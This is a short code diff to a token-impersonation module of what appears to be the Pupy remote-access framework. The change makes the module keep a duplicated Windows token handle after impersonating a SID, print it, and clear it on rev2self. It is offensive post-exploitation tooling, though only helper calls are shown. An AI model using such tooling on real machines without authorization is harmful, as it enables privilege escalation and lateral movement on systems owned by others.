@@ -2,6 +2,8 @@
 from pupylib.PupyModule import *
 from pupylib.utils.rpyc_utils import redirected_stdo
 from modules.lib.windows.migrate import migrate
+import ctypes
+
 __class_name__="ImpersonateModule"
 
 @config(compat="windows", category="exploit")
@@ -25,10 +27,12 @@ class ImpersonateModule(PupyModule):
 				proc_pid=self.client.conn.modules["pupwinutils.security"].create_proc_as_sid(args.impersonate)
 				migrate(self, proc_pid)
 			else:
-				self.client.conn.modules["pupwinutils.security"].impersonate_sid(args.impersonate)
+				self.client.impersonated_dupHandle=self.client.conn.modules["pupwinutils.security"].impersonate_sid_long_handle(args.impersonate, close=False)
+				print self.client.impersonated_dupHandle
 			self.success("Sid %s impersonated !"%args.impersonate)
 		elif args.rev2self:
 			self.client.conn.modules["pupwinutils.security"].rev2self()
+			self.client.impersonated_dupHandle=None
 			self.success("rev2self called")
 		else:
 			self.error("no option supplied")
